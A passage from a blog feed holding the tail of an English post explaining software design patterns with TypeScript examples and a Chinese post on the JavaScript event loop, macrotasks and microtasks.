<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Settings</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> instance: Settings;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">readonly</span> mode = <span class="string">&#x27;dark&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// prevent new with private constructor</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> getInstance(): Settings &#123;</span><br><span class="line">    <span class="keyword">if</span> (!Settings.instance) &#123;</span><br><span class="line">      Settings.instance = <span class="keyword">new</span> Settings();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Settings.instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> settings = Settings.getInstance();</span><br></pre></td></tr></table></figure>
<p>This works too.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> settings = &#123;</span><br><span class="line">  dark: <span class="string">&#x27;true&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id="2-2-Prototype"><a href="#2-2-Prototype" class="headerlink" title="2.2. Prototype"></a>2.2. Prototype</h3><p><strong>It’s a fancy word for clone.</strong></p>
<p>One problem with inheritance is that it can lead to a complex hierarchy of code.</p>
<p><strong>The Prototype pattern is an alterantive way to implement inheritance but instead of inheriting functionality from a class, it comes from an object that’s already been created.</strong> This creates a flat prototype chain that makes it much easier to share functionalities between objects especially in a dynamic language like JavaScript, which supports prototypal inheritance out of box.</p>
<p>A prototype example in JS:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> zombie = &#123;</span><br><span class="line">  <span class="function"><span class="title">eatBrains</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;yum brain&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> chad = <span class="built_in">Object</span>.create(zombie, &#123; <span class="attr">name</span>: &#123; <span class="attr">value</span>: <span class="string">&#x27;chad&#x27;</span> &#125; &#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(chad); <span class="comment">// &#123; name: &#x27;chad&#x27; &#125;</span></span><br><span class="line">chad.eatBrains();  <span class="comment">// works</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(chad); <span class="comment">// &#123;eatBrains: f&#125;</span></span><br></pre></td></tr></table></figure>
<p>When it comes to classes in javascript, prototype refers to its constructor.</p>
<h3 id="2-3-Builder"><a href="#2-3-Builder" class="headerlink" title="2.3. Builder"></a>2.3. Builder</h3><p>Imagine you are running a hot dog stand and when a custimer places an order they need to tell you everything they want in the sandwich in the constructor. That works, <strong>but it’s kind of hard to keep track of all these options and we might want to defer each step to a later point.</strong></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HotDog</span> </span>&#123;</span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  	<span class="keyword">public</span> bun: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">    <span class="keyword">public</span> ketchup: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    <span class="keyword">public</span> mustard: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">     <span class="keyword">public</span> kraut: <span class="built_in">boolean</span></span></span><br><span class="line"><span class="params">  </span>) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> HotDog(<span class="string">&#x27;wheat&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>


<p>With the builder pattern, we create the object step by step using methods rather than the constructor and we can even delegate the building logic to an entirely different class.</p>
<p>In JavaScript, we’ll have each method return this which is a reference to the object instance that allows us to implement method chaining where we instantiate an object then chain methods to it but always get the object as the return value. You’ll come across this pattern frequently with libraries like jQuery but it’s gone a bit out of style in recent years.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HotDog</span> </span>&#123;</span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  	<span class="keyword">public</span> bread: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">    <span class="keyword">public</span> ketchup?: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    <span class="keyword">public</span> mustard?: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">    <span class="keyword">public</span> kraut?: <span class="built_in">boolean</span></span></span><br><span class="line"><span class="params">  </span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">addKetchup</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ketchup = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addMustard</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.mustard = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addKraut</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.kraut = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myLunch = <span class="keyword">new</span> HotDog(<span class="string">&#x27;gluten free&#x27;</span>);</span><br><span class="line"></span><br><span class="line">myLunch</span><br><span class="line">	.addKetchup()</span><br><span class="line">	.addMustard()</span><br><span class="line">	.addKraut()      <span class="comment">// Method Chaining</span></span><br></pre></td></tr></table></figure>


<h3 id="2-4-Factory"><a href="#2-4-Factory" class="headerlink" title="2.4. Factory"></a>2.4. Factory</h3><p><strong>Instead of using the new keyword to instantiate an object, you use a function or method to do it for you.</strong></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IOSButton</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AndroidButton</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Without Factory, that&#x27;s not very maintainable</span></span><br><span class="line"><span class="keyword">const</span> button1 = os === <span class="string">&#x27;ios&#x27;</span> ? <span class="keyword">new</span> IOSButton() : <span class="keyword">new</span> AndroidButton();</span><br><span class="line"><span class="keyword">const</span> button2 = os === <span class="string">&#x27;ios&#x27;</span> ? <span class="keyword">new</span> IOSButton() : <span class="keyword">new</span> AndroidButton();</span><br></pre></td></tr></table></figure>
<p>Instead, we can create a subclass or function that will determine which object to instantiate.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ButtonFactory</span> </span>&#123;</span><br><span class="line">  createButton(os: <span class="built_in">string</span>): IOSButton | AndroidButton &#123;</span><br><span class="line">    <span class="keyword">if</span> (os === <span class="string">&#x27;ios&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> IOSButton();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> AndroidButton();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// With Factory</span></span><br><span class="line"><span class="keyword">const</span> factory = <span class="keyword">new</span> ButtonFactory();</span><br><span class="line"><span class="keyword">const</span> btn1 = factory.createButton(os);</span><br><span class="line"><span class="keyword">const</span> btn2 = factory.createButton(os);</span><br></pre></td></tr></table></figure>
<h3 id="3-Structural-Pattern"><a href="#3-Structural-Pattern" class="headerlink" title="3. Structural Pattern"></a>3. Structural Pattern</h3><h3 id="3-1-Facade"><a href="#3-1-Facade" class="headerlink" title="3.1 Facade"></a>3.1 Facade</h3><p><strong>A facade is the face of a building, inside that building, there’s a lot of complexity that the end user doesn’t need to know about.</strong></p>
<p><strong>A facade is basically just a simplified api to hide other low-level details in your code base.</strong></p>
<p>A facade example in TS:</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlumbingSystem</span> </span>&#123;</span><br><span class="line">  <span class="comment">// low level access to plumbing system</span></span><br><span class="line">  <span class="function"><span class="title">setPressure</span>(<span class="params">v: <span class="built_in">number</span></span>)</span> &#123;&#125;</span><br><span class="line">  <span class="function"><span class="title">turnOn</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">  <span class="function"><span class="title">turnOff</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElectricalSystem</span> </span>&#123;</span><br><span class="line">  <span class="comment">// low level access to electrical system</span></span><br><span class="line">  <span class="function"><span class="title">setVoltage</span>(<span class="params">v: <span class="built_in">number</span></span>)</span> &#123;&#125;</span><br><span class="line">  <span class="function"><span class="title">turnOn</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">  <span class="function"><span class="title">turnOff</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">House</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> plumbing = <span class="keyword">new</span> PlumbingSystem();</span><br><span class="line">  <span class="keyword">private</span> electrical = <span class="keyword">new</span> ElectricalSystem();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="title">turnOnSystems</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.electrical.setVoltage(<span class="number">120</span>);</span><br><span class="line">    <span class="built_in">this</span>.electrical.turnOn();</span><br><span class="line">    <span class="built_in">this</span>.plumbing.setPressure(<span class="number">500</span>);</span><br><span class="line">    <span class="built_in">this</span>.plumbing.turnOn();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="title">shutDown</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.plumbing.turnOff();</span><br><span class="line">    <span class="built_in">this</span>.electrical.turnOff();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> House();</span><br><span class="line">client.turnOnSystems();</span><br><span class="line">client.shutDown();               <span class="comment">// Ugly details hidden</span></span><br></pre></td></tr></table></figure>
<p><strong>Almost every package that you install with javascript could be considered a facade in some way.</strong></p>
<h3 id="3-2-Proxy"><a href="#3-2-Proxy" class="headerlink" title="3.2 Proxy"></a>3.2 Proxy</h3><p><strong>A fancy word for substitute.</strong> You can replace a target object with a proxy.</p>
<p>A great case study is the reactivity system in Vue.js. In Vue, you create data but the framework itself needs a way to intercept that data and update the ui whenever that data changes.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> original = &#123; <span class="attr">name</span>: <span class="string">&#x27;jeff&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> reactive = <span class="keyword">new</span> <span class="built_in">Proxy</span>(original, &#123;</span><br><span class="line">  <span class="function"><span class="title">get</span>(<span class="params">target, key</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Tracking: &#x27;</span>, key);</span><br><span class="line">    <span class="keyword">return</span> target[key];</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">set</span>(<span class="params">target, key, value</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Updating UI...&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, value);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">reactive.name; <span class="comment">// logs &#x27;tracking name&#x27;</span></span><br><span class="line">reactive.name = <span class="string">&#x27;bob&#x27;</span>; <span class="comment">//logs &#x27;updating UI...&#x27;</span></span><br></pre></td></tr></table></figure>


<p>The way Vue handles that is by replacing the original object with a proxy. A proxy takes the original object as the first argument then a handler as the second argument, inside of which, we can override methods like get and set which allows us to run code whenever a property is accessed on the object or changed.</p>
<p>The end user can now work with a proxy just like the original object but it can trigger the side effects behind the scenes.</p>
<p><strong>Proxies are also commonly used when you have a very large object that would be expensive to duplicate in memory.</strong></p>
<h2 id="4-Behavioral-Pattern"><a href="#4-Behavioral-Pattern" class="headerlink" title="4. Behavioral Pattern"></a>4. Behavioral Pattern</h2><h3 id="4-1-Iterator-—-Pull-Based-System"><a href="#4-1-Iterator-—-Pull-Based-System" class="headerlink" title="4.1 Iterator — Pull-Based System"></a>4.1 Iterator — Pull-Based System</h3><p><strong>The iterator pattern allows you to traverse through a collection of objects.</strong> Modern languages already provide abstractions for the iterator pattern like the for loop. When you loop over an array of items, you’re using the iterator pattern.</p>
<p>Implement our own iterator pattern to achieve “range function”</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">range</span>(<span class="params">start: <span class="built_in">number</span>, end: <span class="built_in">number</span>, step=<span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    [<span class="built_in">Symbol</span>.iterator]() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">next</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (start &lt; end) &#123;</span><br><span class="line">        start = start + step;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">value</span>: start, <span class="attr">done</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">true</span>, <span class="attr">value</span>: end &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> n <span class="keyword">of</span> range(<span class="number">0</span>, <span class="number">20</span>, <span class="number">5</span>))) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-2-Observer-—-Push-Based-System"><a href="#4-2-Observer-—-Push-Based-System" class="headerlink" title="4.2 Observer — Push-Based System"></a>4.2 Observer — Push-Based System</h3><p><strong>The observer pattern allows many objects to subscribe to events that are broadcast by another object. It’s a one-to-mant relationship.</strong></p>
<p>This pattern is used all over the place in app development. Like in firebase, when your data changes on the server, all your client apps are subscribed to it and automatically updated with the latest data.</p>
<p>rijx library example for observer</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Subject &#125; from &#39;rxjs&#39;;</span><br><span class="line"></span><br><span class="line">const news &#x3D; new Subject();</span><br><span class="line"></span><br><span class="line">const tv1 &#x3D; news.subscribe(v &#x3D;&gt; console.log(v + &#39;via Den TV&#39;));</span><br><span class="line">const tv2 &#x3D; news.subscribe(v &#x3D;&gt; console.log(v + &#39;via Batcave TV&#39;));</span><br><span class="line">const tv3 &#x3D; news.subscribe(v &#x3D;&gt; console.log(v + &#39;via Airport TV&#39;));</span><br><span class="line"></span><br><span class="line">news.next(&#39;Breaking new: &#39;);</span><br><span class="line">news.next(&#39;The war is over &#39;);</span><br></pre></td></tr></table></figure>
<p>Personally, I like to think of this as a loop that unfolds over the dimension of time. (Haven’t got the idea yet)</p>
<h3 id="4-3-Mediator"><a href="#4-3-Mediator" class="headerlink" title="4.3 Mediator"></a>4.3 Mediator</h3><p><strong>A mediator is like a middleman or broker.</strong></p>
<p>A practical example, in the express.js web framework, there’s a middleware system, you have incoming requests and outgoing responses. <strong>Middleware sits in the middle by intercepting every request and transform it into the proper format for the response. It provides a separation of concerns and eliminates code duplication.</strong></p>
<h3 id="4-4-State"><a href="#4-4-State" class="headerlink" title="4.4 State"></a>4.4 State</h3><p><strong>State Pattern is where an object behaves differently based on a finite number of states.</strong></p>
<p>Without state pattern, you’ve likely used conditional logic or switch statements to handle a bunch of different possibilities based on the state or data in your application. Code like this generally doesn’t scale very well.</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Without State Pattern</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">think</span>(<span class="params">mood</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (mood) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;happy&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I am happy&quot;</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;sad&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I am sad&quot;</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I am neutral&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The state pattern allows you to start with one base class then provide it with different functionality based on its internal state. The idea is related to finite state machines and libraries like xstate where the goal is to make the object’s behavior predictable based on its underlying state.</p>
<p>Another way to go about it would be to create a separate class for each possible state, inside each class, we will have an identical method that behaves differently. <strong>Now in the Human Class, we set the state as a property and whenever that method is called, we delegate it to its current state. That means whenever the state changes, the object will behave in a completely different way, but at the same time, we don’t have to change the api or use a bunch of conditional logic.</strong></p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> State &#123;</span><br><span class="line">  think(): <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> </span>&#123;</span><br><span class="line">  state: State;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.state = <span class="keyword">new</span> HappyState();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">think</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.state.think();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">changeState</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.state = state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>“10 Design Patterns Explained in 10 Minutes” — <a href="https://www.youtube.com/watch?v=tv-_1er1mWI">https://www.youtube.com/watch?v=tv-_1er1mWI</a></p>
]]></content>
      <categories>
        <category>Design Pattern</category>
      </categories>
      <tags>
        <tag>Design Pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>事件循环 &amp; 微任务、宏任务</title>
    <url>/2022/02/22/EventLoop/</url>
    <content><![CDATA[<p><strong>浏览器中的 JS 的执行流程</strong>和 <strong>NodeJS 中的流程</strong>都是遵循<strong>事件循环</strong>的。理解事件循环的工作方式对于代码优化很重要，有时对于正确的架构也很重要。</p>
<a id="more"></a>

<h1 id="事件循环——微任务和宏任务"><a href="#事件循环——微任务和宏任务" class="headerlink" title="事件循环——微任务和宏任务"></a>事件循环——微任务和宏任务</h1><p><strong>浏览器中的 JS 的执行流程</strong>和 <strong>NodeJS 中的流程</strong>都是遵循<strong>事件循环</strong>的。</p>
<h2 id="一、事件循环"><a href="#一、事件循环" class="headerlink" title="一、事件循环"></a>一、事件循环</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>事件循环是 JavaScript 引擎在等待任务、执行任务、以及进入休眠等待更多任务，这三个状态之间转换的无限循环。</p>
<p><strong>引擎的一般流程（循环）：</strong></p>
<blockquote>
<ol>
<li>设置任务</li>
<li>引擎处理任务（如果有多个任务，则它们会组成一个队列即<strong>“宏任务队列”</strong>，按照先进先出的原则来处理任务即先进入的任务会被先执行）</li>
<li>所有任务处理完成，引擎进入休眠等待新任务出现（休眠期间几乎不消耗任何CPU资源），然后转到第1步</li>
</ol>
</blockquote>
<p><strong>注意：</strong></p>
<ul>
<li><strong>引擎执行任务时永远不会进行渲染（render）</strong>。即使任务执行需要很长时间，它也会等到任务完成之后才会绘制对 DOM 的更改。</li>
<li>如果一项任务执行时间过长，则在该任务完成前，浏览器将无法执行后续其它任务。因此，在预设的某个时间段后，浏览器会抛出一个诸如“页面未响应”之类的警告，建议终止这个任务。（这种情况通常发生在有大量复杂计算或导致死循环的程序错误时）</li>
</ul>
<h2 id="二、拆分CPU过载任务"><a href="#二、拆分CPU过载任务" class="headerlink" title="二、拆分CPU过载任务"></a>二、拆分CPU过载任务</h2><p><strong>问题场景：</strong>如果 JS 引擎正在执行一个 CPU 过载的任务即该任务需要耗费大量的 CPU 资源和时间。那么在该任务完成前，引擎无法处理其它的DOM相关的任务，例如处理用户事件，这会表现为“网页卡顿很长一段时间，并且无法响应用户的其它交互行为”。这种情况是需要被避免的。</p>
<p><strong>解决方法：</strong>这时，我们可以通过<strong>将大任务拆分为多个小任务</strong>来避免这个问题。每完成一个小任务，就使用<code>setTimeout</code>（延时参数设置为0）方法来再次安排一个小任务，直到所有小任务都被完成。</p>
<p><strong>示例代码如下：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 一个大任务</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">1e9</span>; j++) &#123;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
<p>上面的代码块展示了一个耗时很长的大任务，该任务可能会使浏览器显示一个“脚本执行时间过长”的警告。</p>
<p><strong>下面，我们使用<code>setTimeout</code>方法来拆分这个大任务：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 小任务 (*)</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    i++;</span><br><span class="line">  &#125; <span class="keyword">while</span> (i % <span class="number">1e6</span> !== <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">1e9</span>) &#123;</span><br><span class="line">      alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(count, <span class="number">0</span>); <span class="comment">// (**)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
<p>现在，JS 引擎可以分批处理每个小任务，并且不影响后续其它任务的执行。原因在于：</p>
<ol>
<li>引擎首先执行（*）的小任务</li>
<li>完成一个小任务后，如果该任务不是最后一个小任务，则调用<code>setTimeout</code>来安排一个新的小任务</li>
<li>执行宏任务队列中的剩余任务，然后重复步骤一、二，直到所有小任务都完成。</li>
</ol>
<p>可见，关键在于**<code>setTimeout</code><strong>函数，</strong><code>setTimeout</code>会在时间到达时，为 JS 引擎安排一个回调函数事件，该事件会被插入到宏任务队列中**。在此之前，如果有其他事件发生，如用户点击事件，则会被先安排入宏任务队列，并按照先进先出的原则，优先执行，从而避免“脚本执行时间过长”、浏览器“挂起（hang）”的问题。</p>
<p><strong>此外注意：</strong>多个嵌套的<code>setTimeout</code>调用在浏览器中的最小延迟为 4ms。因此即使我们设置了延迟为0，但还是至少需要 4ms的延迟。所以如果安排的越早，运行会越快，上述代码可以改写一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (i &lt; <span class="number">1e9</span> - <span class="number">1e6</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(count); <span class="comment">// 安排新的调用</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 小任务 (*)</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    i++;</span><br><span class="line">  &#125; <span class="keyword">while</span> (i % <span class="number">1e6</span> !== <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (i === <span class="number">1e9</span>) &#123;</span><br><span class="line">      alert(<span class="string">&#x27;Done in &#x27;</span> + (<span class="built_in">Date</span>.now() - start) + <span class="string">&#x27;ms!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count();</span><br></pre></td></tr></table></figure>
<h2 id="三、宏任务-amp-微任务"><a href="#三、宏任务-amp-微任务" class="headerlink" title="三、宏任务&amp;微任务"></a>三、宏任务&amp;微任务</h2><p>除了<strong>宏任务（macrotask）</strong>，还有<strong>微任务（microtask）</strong>。</p>
<p><strong>微任务</strong>仅来自我们的代码：</p>
<ol>
<li>由 Promise 创建的 <strong>promise 对象的<code>.then/catch/finally</code>的处理程序</strong></li>
<li><strong><code>await</code>的幕后</strong>（因此 await 是 promise 的另一种形式）</li>
<li>**特殊函数<code>queueMicrotask(func)</code>**，它会对<code>func</code>进行排队，以在微任务队列中执行</li>
</ol>
<h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p><strong>每个宏任务之后，引擎会立即执行微任务队列中的所有微任务，然后再执行其他的宏任务或渲染或其它操作。</strong></p>
<p>举例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;3&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve()</span><br><span class="line">	.then(<span class="function">() =&gt;</span> alert(<span class="string">&#x27;2&#x27;</span>));</span><br><span class="line"></span><br><span class="line">alert(<span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>对上述代码，引擎的执行顺序是：</p>
<ol>
<li>首先执行同步代码<code>alert(&#39;1&#39;)</code>，所以首先显示“1”</li>
<li>然后执行 Promise 中的<code>then</code>中的回调函数，因为<code>then</code>是一个微任务，它会在微任务队列中，等一个宏任务执行结束后，会被立即执行，所以第二个显示的是“2”</li>
<li>最后异步调用<code>setTimeout</code>中的回调函数会被从宏任务队列中取出执行，所以最后显示的是“3”</li>
</ol>
<p><strong>注：</strong>微任务会在执行任何其他操作（宏任务或渲染）前被完成，因此它<strong>确保了微任务之间的应用程序环境基本相同</strong>（即没有新的网络数据、没有DOM更改等）。</p>
<h2 id="四、总结事件循环算法"><a href="#四、总结事件循环算法" class="headerlink" title="四、总结事件循环算法"></a>四、总结事件循环算法</h2><ol>
<li><p><strong>宏任务队列</strong>遵循先进先出原则，首先取出并执行最早的任务</p>
</li>
<li><p><strong>执行微任务队列中所有的微任务</strong>：</p>
<ul>
<li>微任务队列也遵循先进先出原则，首先取出并执行最早的微任务</li>
</ul>
</li>
<li><p><strong>渲染（如果DOM改变）</strong></p>
</li>
<li><p>重复前三个步骤</p>
</li>
<li><p>直到<strong>宏任务队列为空</strong>，则 JS 引擎<strong>休眠</strong>等待新任务</p>
</li>
</ol>
<h2 id="五、安排新的宏任务"><a href="#五、安排新的宏任务" class="headerlink" title="五、安排新的宏任务"></a>五、安排新的宏任务</h2><p>可以使用零延迟的<code>setTimeout</code>。它同时还可以将大任务拆分为多个小任务，以便浏览器能够对用户事件作出反应。</p>
]]></content>
      <categories>
        <category>FrontEnd/前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>前端知识-杂谈</title>
